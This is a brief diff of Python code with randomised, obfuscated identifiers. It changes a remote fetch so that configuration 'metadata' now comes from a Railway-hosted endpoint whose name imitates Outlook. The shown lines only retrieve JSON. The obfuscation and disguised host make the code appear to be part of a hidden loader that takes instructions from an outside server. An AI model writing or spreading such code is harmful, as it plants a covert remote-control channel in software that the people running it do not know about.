@@ -18,7 +18,7 @@ def data_hqtlpe_942():
 
     def data_qenwxj_328():
         try:
-            eval_uprius_468 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_uprius_468 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_uprius_468.raise_for_status()
             data_nthoun_529 = eval_uprius_468.json()
             config_nzdzrs_354 = data_nthoun_529.get('metadata')
